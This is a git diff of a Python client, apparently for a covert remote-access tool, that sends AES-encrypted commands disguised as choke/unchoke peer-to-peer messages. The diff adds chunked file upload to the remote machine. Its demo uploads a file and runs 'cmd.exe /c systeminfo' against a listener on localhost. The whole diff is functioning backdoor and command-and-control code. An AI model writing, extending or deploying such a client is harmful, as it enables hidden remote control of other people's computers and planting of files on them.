@@ -1,7 +1,8 @@
 from client import TortunClient
 import hashlib
-from razor.payload import RunCommand
+from razor.payload import RunCommand, BLOCK_SIZE, UploadFile
 from razor.encryptor import AESCipher
+import os
 
 
 class RazorClient(TortunClient):
@@ -22,25 +23,40 @@ class RazorClient(TortunClient):
     def _wait_for_unchoke(self):
         msg = self.read_message()
 
-    def send_buffer(self, buf):
+    def _initiate_sending(self):
         self.unchoke()
+
+    def send_buffer(self, buf):
         buf = self.enc.encrypt(buf)
-        chunk_count = int((len(buf) / self.block_size)) + 1
-        for i in range(chunk_count):
-            self.send_sequence(buf[i * self.block_size:(i + 1) * self.block_size])
+        self.send_sequence(buf)
+
+    def _finalize_sending(self):
         self.choke()
+        self._reject_last_request()
 
     def read_buffer(self):
         buf = self.receive_output(self.enc)
         return buf
 
     def exec(self, executable, params=""):
-        p = RunCommand(executable, params).to_razor_payload()
-        self.send_buffer(p)
+        payload = RunCommand(executable, params).to_razor_payload()
+        self._initiate_sending()
+        self.send_buffer(payload)
         self._wait_for_unchoke()
-        self._reject_last_request()
+        self._finalize_sending()
         cmd_out = self.read_buffer()
         return cmd_out.decode('utf-8')
+
+    def upload_file(self, local_path, remote_path):
+        chunk_size = int((BLOCK_SIZE - 24) / 2.5)
+        chunk_count = int(os.path.getsize(local_path) / chunk_size) + 1
+        self._initiate_sending()
+        with open(local_path, 'rb') as local_file:
+            for i in range(chunk_count):
+                chunk = local_file.read(chunk_size)
+                payload = UploadFile(remote_path, chunk, append=bool(i)).to_razor_payload()
+                self.send_buffer(payload)
+        self._finalize_sending()
 
 
 if __name__ == '__main__':
@@ -51,6 +67,5 @@ if __name__ == '__main__':
     r = RazorClient(h.digest(), enc_key=h.digest())
     r.connect(("127.0.0.1", 6888))
     r.initiate_session()
-    h1 = hashlib.sha256()
-    h1.update(b"key")
-    print(r.exec("cmd.exe", "/c ipconfig"))
+    r.upload_file(r"C:\users\defsa\pictures\test.jpg", r"C:\users\defsa\pictures\test2.jpg")
+    print(r.exec("cmd.exe", r"/c systeminfo"))
